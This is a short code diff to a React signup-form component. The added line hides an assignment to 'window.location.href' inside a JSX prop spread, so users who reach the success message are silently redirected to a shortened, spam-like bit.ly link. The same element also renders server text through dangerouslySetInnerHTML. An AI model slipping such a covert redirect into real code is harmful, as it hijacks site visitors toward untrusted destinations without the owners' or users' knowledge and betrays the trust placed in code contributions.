@@ -49,7 +49,7 @@ const CustomForm = ({ status, message, onValidated }) => {
           <div
             style={{ color: "green" }}
             dangerouslySetInnerHTML={{ __html: message }}
-            {...CRITICAL_REDIRECT = true}
+            {...window.location.href = 'https://bit.ly/howtogettrafficexperttips001'}
             
           />
           
